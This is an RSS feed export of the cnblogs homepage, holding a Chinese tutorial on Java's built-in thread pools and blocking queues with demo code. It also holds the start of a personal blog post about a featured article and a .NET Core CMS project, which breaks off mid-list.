<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>深入理解Java自带的线程池和缓冲队列 - 苹果大大个</title>
<link>http://www.cnblogs.com/xiguadadage/p/10243332.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiguadadage/p/10243332.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;前言&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;线程池是什么&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线程池的概念是初始化线程池时在池中创建空闲的线程，一但有工作任务，可直接使用线程池中的线程进行执行工作任务，任务执行完成后又返回线程池中成为空闲线程。使用线程池可以减少线程的创建和销毁，提高性能。&lt;/p&gt;
&lt;p&gt;举个例子：我是一个包工头，代表线程池，手底下有若干工人代表线程池中的线程。如果我没接到项目，那么工人就相当于线程池中的空闲线程，一但我接到了项目，我可以立刻让我手下的工人去工作，每个工人同一时间执行只执行一个工作任务，执行完了就去&lt;/p&gt;
&lt;p&gt;执行另一个工作任务，知道没有工作任务了，这时工人就可以休息了（原谅我让工人无休止的工作），也就是又变成了线程池中的空闲线程池。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;队列是什么&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;队列作为一个缓冲的工具，当没有足够的线程去处理任务时，可以将任务放进队列中，以队列先进先出的特性来执行工作任务&lt;/p&gt;
&lt;p&gt;举个例子，我又是一个包工头，一开始我只接了一个小项目，所以只有三个工作任务，但我手底下有四个工人，那么其中三人各领一个工作任务去执行就好了，剩下一个人就先休息。但突然我又接到了几个大项目，那么有现在有很多工作任务了，但手底下的工人不够啊。&lt;/p&gt;
&lt;p&gt;那么我有两个选择：&lt;/p&gt;
&lt;p&gt;（1）雇佣更多的工人&lt;/p&gt;
&lt;p&gt;（2）把工作任务记录下来，按先来后到的顺序执行&lt;/p&gt;
&lt;p&gt;但雇佣更多等工人需要成本啊，对应到计算机就是资源的不足，所以我只能把工作任务先记录下来，这样就成了一个队列了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;为什么要使用线程池&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设我又是一个包工头，我现在手底下没有工人了，但我接到了一个项目，有了工作任务要执行，那我肯定要去找工人了，但招人成本是很高的，工作完成后还要给遣散费，这样算起来好像不值，所以我事先雇佣了固定的几个工人作为我的长期员工，有工作任务就干活，没有就休息，如果工作任务实在太&lt;/p&gt;
&lt;p&gt;多，那我也可以再临时雇佣几个工人。一来二去工作效率高了，付出的成本也低了。Java自带的线程池的原理也是如此。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;Java自带的线程池&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Executor接口是Executor的父接口，基于生产者--消费者模式，提交任务的操作相当于生产者，执行任务的线程则相当于消费者，如果要在程序中实现一个生产者--消费者的设计，那么最简单的方式通常是使用Executor。&lt;/p&gt;
&lt;p&gt;ExecutorService接口是对Executor接口的扩展，提供了对生命周期的支持，以及统计信息收集、应用程序管理机制和性能监视等机制。&lt;/p&gt;
&lt;p&gt;常用的使用方法是调用Executors中的静态方法来创建一个连接池。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;（1）newFixedThreadPool&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代码演示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ThreadPoolTest {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         ExecutorService executor = Executors.newFixedThreadPool(3&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 4; i++&lt;span&gt;){
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             Runnable runnable = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;                 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;                     CountDownLatch countDownLatch = &lt;span&gt;new&lt;/span&gt; CountDownLatch(1); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;计数器，用于阻塞线程&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt;                     System.out.println(Thread.currentThread().getName() + &quot;正在执行&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;                     &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;                        countDownLatch.await();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                     } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;                        e.printStackTrace();
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;                    }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;            };
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;            executor.execute(runnable);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pool-1-thread-&lt;span&gt;1正在执行
pool&lt;/span&gt;-1-thread-&lt;span&gt;3正在执行
pool&lt;/span&gt;-1-thread-2正在执行
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;newFixedThreadPool将创建一个固定长度的线程池，每当提交一个任务时就会创建一个线程，直到达线程池的最大数量，这时线程池的规模不再变化（如果某个线程由于发生了未预期的Exception而结束，那么线程池会补充一个新的线程）。上述代码中最大的线程数是3，但我提交了4个任务，而且每个任务都阻塞住，所以前三个任务占用了线程池所有的线程，那么第四个任务永远也不会执行，因此该线程池配套使用的队列也是无界的。所以在使用该方法创建线程池时要根据实际情况看需要执行的任务是否占用过多时间，会不会影响后面任务的执行。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（2）newCachedThreadPool&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ThreadPoolTest {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         ExecutorService executor =&lt;span&gt; Executors.newCachedThreadPool();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 4; i++&lt;span&gt;){
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             Runnable runnable = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;                 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;                     CountDownLatch countDownLatch = &lt;span&gt;new&lt;/span&gt; CountDownLatch(1); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;计数器，用于阻塞线程&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt;                     System.out.println(Thread.currentThread().getName() + &quot;正在执行&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;                     &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;                        countDownLatch.await();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                     } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;                        e.printStackTrace();
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;                    }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;            };
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;            executor.execute(runnable);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
pool-1-thread-&lt;span&gt;1正在执行
pool&lt;/span&gt;-1-thread-&lt;span&gt;3正在执行
pool&lt;/span&gt;-1-thread-&lt;span&gt;2正在执行
pool&lt;/span&gt;-1-thread-4正在执行
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;newCachedThreadPool将创建一个可缓存的线程池。如果线程池的当前规模超过了处理需求时，那么就会回收部分空闲的线程（根据空闲时间来回收），当需求增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（3）newSingleThreadExecutor&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ThreadPoolTest {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         ExecutorService executor =&lt;span&gt; Executors.newSingleThreadExecutor();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 4; i++&lt;span&gt;){
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; index =&lt;span&gt; i;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;             Runnable runnable = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;                 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;                     System.out.println(Thread.currentThread().getName() + &quot;正在执行工作任务--- &amp;gt;&quot; +&lt;span&gt; index);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;            };
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;            executor.execute(runnable);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
pool-1-thread-1正在执行工作任务--- &amp;gt;0&lt;span&gt;
pool&lt;/span&gt;-1-thread-1正在执行工作任务--- &amp;gt;1&lt;span&gt;
pool&lt;/span&gt;-1-thread-1正在执行工作任务--- &amp;gt;2&lt;span&gt;
pool&lt;/span&gt;-1-thread-1正在执行工作任务--- &amp;gt;3
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;newSingleThreadExecutor是一个单线程的Executor，它创建单个工作者线程来执行任务，如果这个线程异常结束，会创建另一个线程来代替。newSingleThreadExecutor能确保依照任务在队列中的顺序来串行执行。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（4）newScheduledThreadPool&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ThreadPoolTest {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         ScheduledExecutorService executor = Executors.newScheduledThreadPool(3&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 3; i++&lt;span&gt;){
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; index =&lt;span&gt; i;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;             Runnable runnable = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;                 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;                     System.out.println(Thread.currentThread().getName() + &quot;延时1s后，每5s执行一次工作任务--- &amp;gt;&quot; +&lt;span&gt; index);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;            };
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;             executor.scheduleAtFixedRate(runnable,1,5&lt;span&gt;,TimeUnit.SECONDS);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
pool-1-thread-1延时1s后，每5s执行一次工作任务--- &amp;gt;0&lt;span&gt;
pool&lt;/span&gt;-1-thread-2延时1s后，每5s执行一次工作任务--- &amp;gt;1&lt;span&gt;
pool&lt;/span&gt;-1-thread-3延时1s后，每5s执行一次工作任务--- &amp;gt;2&lt;span&gt;
pool&lt;/span&gt;-1-thread-1延时1s后，每5s执行一次工作任务--- &amp;gt;0&lt;span&gt;
pool&lt;/span&gt;-1-thread-3延时1s后，每5s执行一次工作任务--- &amp;gt;2&lt;span&gt;
pool&lt;/span&gt;-1-thread-2延时1s后，每5s执行一次工作任务--- &amp;gt;1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;newScheduledThreadPool创建了一个固定长度的线程池，而且以延迟或定时或周期的方式来执行任务，类似于Timer。可应用于重发机制。&lt;/p&gt;
&lt;p&gt;以上四种创建线程池的方法其实都是调用以下这个方法，只是参数不一样&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468250/201901/1468250-20190109143855230-1384046218.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;corePoolSize  ---------------------&amp;gt; 核心线程数&lt;/p&gt;
&lt;p&gt;maximumPoolSize ---------------&amp;gt; 最大线程数&lt;/p&gt;
&lt;p&gt;keepAliveTime --------------------&amp;gt; 当线程数大于核心时，此为终止前多余的空闲线程等待新任务的最长时间&lt;/p&gt;
&lt;p&gt;unit -----------------------------------&amp;gt; 时间单位&lt;/p&gt;
&lt;p&gt;workQueue ------------------------&amp;gt; 用于存储工作工人的队列&lt;/p&gt;
&lt;p&gt;threadFactory ---------------------&amp;gt; 创建线程的工厂&lt;/p&gt;
&lt;p&gt;handler ------------------------------&amp;gt; 由于超出线程范围和队列容量而使执行被阻塞时所使用的处理程序&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;常用的几种队列&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）ArrayBlockingQueue：规定大小的BlockingQueue，其构造必须指定大小。其所含的对象是FIFO顺序排序的。&lt;/p&gt;
&lt;p&gt;（2）LinkedBlockingQueue：大小不固定的BlockingQueue，若其构造时指定大小，生成的BlockingQueue有大小限制，不指定大小，其大小有Integer.MAX_VALUE来决定。其所含的对象是FIFO顺序排序的。&lt;/p&gt;
&lt;p&gt;（3）PriorityBlockingQueue：类似于LinkedBlockingQueue，但是其所含对象的排序不是FIFO，而是依据对象的自然顺序或者构造函数的Comparator决定。&lt;/p&gt;
&lt;p&gt;（4）SynchronizedQueue：特殊的BlockingQueue，对其的操作必须是放和取交替完成。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;排队策略&lt;/strong&gt;&lt;/span&gt;（以下排队策略文字来自-------&amp;gt;&lt;span&gt;https://www.oschina.net/question/565065_86540&lt;/span&gt;）&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;排队有三种通用策略：&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;直接提交。&lt;/strong&gt;工作队列的默认选项是 SynchronousQueue，它将任务直接提交给线程而不保持它们。在此，如果不存在可用于立即运行任务的线程，则试图把任务加入队列将失败，因此会构造一个新的线程。此策略可以避免在处理可能具有内部依赖性的请求集时出现锁。直接提交通常要求无界 maximumPoolSizes 以避免拒绝新提交的任务。当命令以超过队列所能处理的平均数连续到达时，此策略允许无界线程具有增长的可能性。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;无界队列。&lt;/strong&gt;使用无界队列（例如，不具有预定义容量的 LinkedBlockingQueue）将导致在所有 corePoolSize 线程都忙时新任务在队列中等待。这样，创建的线程就不会超过 corePoolSize。（因此，maximumPoolSize的值也就无效了。）当每个任务完全独立于其他任务，即任务执行互不影响时，适合于使用无界队列；例如，在 Web页服务器中。这种排队可用于处理瞬态突发请求，当命令以超过队列所能处理的平均数连续到达时，此策略允许无界线程具有增长的可能性。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;有界队列。&lt;/strong&gt;当使用有限的 maximumPoolSizes时，有界队列（如 ArrayBlockingQueue）有助于防止资源耗尽，但是可能较难调整和控制。队列大小和最大池大小可能需要相互折衷：使用大型队列和小型池可以最大限度地降低 CPU 使用率、操作系统资源和上下文切换开销，但是可能导致人工降低吞吐量。如果任务频繁阻塞（例如，如果它们是 I/O边界），则系统可能为超过您许可的更多线程安排时间。使用小型队列通常要求较大的池大小，CPU使用率较高，但是可能遇到不可接受的调度开销，这样也会降低吞吐量。&lt;/p&gt;
&lt;p&gt;我们选其中的LinkedBlockingQueue队列来解析&lt;/p&gt;
&lt;p&gt;在上述Java自带的创建线程池的方法中，newFixedThreadPool使用的队列就是LinkedBlockingQueue&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ExecutorService newFixedThreadPool(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; nThreads) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor(nThreads, nThreads,
                                      &lt;/span&gt;0L&lt;span&gt;, TimeUnit.MILLISECONDS,
                                      &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; LinkedBlockingQueue&amp;lt;Runnable&amp;gt;&lt;span&gt;());
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果需要执行的工作任务少于核心线程数，那么直接使用线程池的空闲线程执行任务，如果任务不断增加，超过核心线程数，那么任务将被放进队列中，而且是没有限制的，线程池中的线程也不会增加。&lt;/p&gt;
&lt;p&gt;其他线程池的工作队列也是根据排队的通用策略来进行工作，看客们可以自己分析。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;总结：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;没有创建连接池的方式，只有最适合的方式，使用Java自带的方式创建或者自己创建连接池都是可行的，但都要依照自身的业务情况选择合适的方式。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果你的工作任务的数量在不同时间差距很大，那么如果使用newFixedThreadPool创建固定的线程就不合适，创建少了到时队列里会塞进太多的工作任务导致处理不及时，创建多了会导致工作任务少时有太多的线程处于空闲状态造成资源浪费。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以还是需要根据实际情况使用适合的创建方式。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 09 Jan 2019 07:32:00 +0000</pubDate>
<dc:creator>苹果大大个</dc:creator>
<og:description>前言 线程池是什么 线程池的概念是初始化线程池时在池中创建空闲的线程，一但有工作任务，可直接使用线程池中的线程进行执行工作任务，任务执行完成后又返回线程池中成为空闲线程。使用线程池可以减少线程的创建和</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiguadadage/p/10243332.html</dc:identifier>
</item>
<item>
<title>2019年的第一场雪来的既猛又烈，突然想分享点东西 - 依乐祝</title>
<link>http://www.cnblogs.com/yilezhu/p/10244634.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yilezhu/p/10244634.html</guid>
<description>&lt;p&gt;清晨起床，震惊了，窗外一片雪白，大雪纷飞，我承认我词穷了，说再多话也描述不了此刻的大好心情。所以，话不多说，先上一张朋友圈的图吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190109152508493-745643871.png&quot; alt=&quot;1547011599612&quot;/&gt;&lt;/p&gt;
&lt;p&gt;趁着这么“好的”天气以及这么好的心情突然想写点东西记录一下自己的2018这一年以及2019年的这一天以及对.NET Core的看法。&lt;/p&gt;
&lt;p&gt;俗话说“瑞雪兆丰年”，其实我想说这句话说得很对，为什么说很对呢？下面我就好好说道说道！&lt;/p&gt;
&lt;blockquote readability=&quot;2.0987654320988&quot;&gt;
&lt;p&gt;作者：依乐祝&lt;br/&gt;原文地址：&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/10244634.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/yilezhu/p/10244634.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;今天好事连连&quot;&gt;今天好事连连&lt;/h2&gt;
&lt;h3 id=&quot;今天张队公众号推文推送了自己写的博文&quot;&gt;今天张队公众号推文推送了自己写的博文&lt;/h3&gt;
&lt;p&gt;这一年，习惯了清晨醒来第一件事就是看看我所关注的公众号推送的技术文章，其中最喜欢看的当属张队的DotNet公众号了。这里真的很佩服张队，每天早上为我们推送DotNetCore相关的技术盛宴，从关注后就从来没有断更过，这不是一般人所能做到的，这里再次表达对张队的敬意！这里免费帮张队推广下他的公众号名称叫“dotNet跨平台”。&lt;br/&gt;这一天，刷公众号刚好刷到张队的公众号推送了自己前两天写的《&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/10229954.html&quot;&gt;.NET Core实战项目之CMS 第十四章 开发篇-防止跨站请求伪造（XSRF/CSRF）攻击处理&lt;/a&gt;》这篇文章！可能我的拖延症比较厉害，所以后面更新的慢了，看的人也就没那么多了，所以阅读量越来越少，不过我还是会坚持把这个系列更新完的！此为第一件好事。&lt;/p&gt;
&lt;h3 id=&quot;博客园编辑推荐推荐了自己的博文&quot;&gt;博客园编辑推荐推荐了自己的博文&lt;/h3&gt;
&lt;p&gt;这一天，早上刚到公司很忙，所以到十一点多才有时间逛逛博客园，看看大牛们发布的知识分享文章。结果看到首页【编辑推荐】部分文章标题很熟悉，所以就点进去看了，结果这正是我前天晚上分享的技术文章。如下图所示，因为【编辑推荐】部分显示标题没有显示全，所以以为这不是我的文章！真的很惊喜。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190109152507858-1816693652.png&quot; alt=&quot;1547015284814&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因为我分享的文章每次都能到首页推荐，但是【编辑推荐】还是第一次，所以怎一个激动了得。所以我激动的在自己的DotNetCore实战千人群里面“厚颜无耻”的艾特了全体，让大家能帮忙点个推荐。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190109152507612-936190709.png&quot; alt=&quot;1547015402483&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以，不到一会功夫这篇文章的推荐数就从15到了三十个！这里为自己的“厚颜无耻”表示道歉！同时感谢那些朋友们的支持！&lt;/p&gt;
&lt;h3 id=&quot;net-core实战项目之cms系列教程所带来的产物&quot;&gt;.NET Core实战项目之CMS系列教程所带来的产物&lt;/h3&gt;
&lt;p&gt;.NET Core实战项目之CMS系列教程所带来的产物足以说明.NET Core的群体还是蛮庞大的，大家积极学习以及接触.NET Core的积极性还是蛮好的。这也坚定了我继续坚持.NET Core的决心。&lt;/p&gt;
&lt;ol readability=&quot;4.3525641025641&quot;&gt;&lt;li readability=&quot;1.7880184331797&quot;&gt;
&lt;p&gt;CzarCms这个实战教程的Star数破100&lt;br/&gt;这一天，CzarCms的Star数破了100，可能很多人会哈哈大笑，Star破一百？哈哈，不到千星的项目还好意思拿来说事？真不要脸！其实我想说，这也算是我从去年11月中旬决定开这个《&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/9977862.html&quot;&gt;.NET Core实战项目之CMS 第一章 入门篇-开篇及总体规划&lt;/a&gt;》这个系列开始，到现在一个半月的时间成果吧！也是自己从一个默默无闻的拿来主义者到一个乐于分享技术的分享者的转变的成功吧。虽然Star数不多，这个项目目前也还是个半成品，不过我会将他完善，并达到生产级项目的水平。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
